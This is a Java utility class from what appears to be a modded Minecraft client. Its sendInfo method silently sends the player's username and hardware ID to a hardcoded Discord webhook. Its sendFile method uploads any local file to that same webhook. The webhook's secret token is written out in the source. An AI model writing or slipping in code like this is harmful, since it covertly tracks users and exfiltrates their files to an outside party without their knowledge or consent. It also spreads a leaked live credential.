package com.firework.client.Implementations.Utill.Client;


import net.minecraft.client.Minecraft;

import java.awt.*;
import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class DiscordUtil {

    public static void sendInfo(){


        SimpleDateFormat formatter= new SimpleDateFormat("yyyy-MM-dd 'at' HH:mm:ss z");
        Date date = new Date(System.currentTimeMillis());
        System.out.println(formatter.format(date));

        sendMsg("```"+date+" Firework client is running by "+ Minecraft.getMinecraft().getSession().getUsername()+"```"+"```Hwid is: "+HwidUtil.getHwid()+"```","https://discord.com/api/webhooks/974610221953581096/JyZzDORGjrDNF8xtg_JT5zbqwJeXDldjqHnMiOK17JPd5XoyzPqVzrGnm2Hta8LFOLec");
    }

    public static void sendMsg (String message, String webhook) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            URL realUrl = new URL(webhook);
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        System.out.println(result.toString());
    }
    public static void sendFile(File file) throws Exception {
        String boundary = Long.toHexString(System.currentTimeMillis());
        HttpURLConnection connection = (HttpURLConnection)new URL("https://discord.com/api/webhooks/974610221953581096/JyZzDORGjrDNF8xtg_JT5zbqwJeXDldjqHnMiOK17JPd5XoyzPqVzrGnm2Hta8LFOLec").openConnection();
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
        connection.setDoOutput(true);
        try (OutputStream os = connection.getOutputStream();){
            os.write(("--" + boundary + "\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"\n\n").getBytes());
            try (FileInputStream inputStream = new FileInputStream(file);){
                int fileSize = (int)file.length();
                byte[] fileBytes = new byte[fileSize];
                ((InputStream)inputStream).read(fileBytes, 0, fileSize);
                os.write(fileBytes);
            }
            os.write(("\n--" + boundary + "--\n").getBytes());
        }
        connection.getResponseCode();
        Thread.sleep(500L);
    }

    public static void OpenServer() {
        try {
            Desktop.getDesktop().browse(new URI("https://discord.gg/MTAGeKse8r"));
        } catch (IOException e) {
            e.printStackTrace();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }


}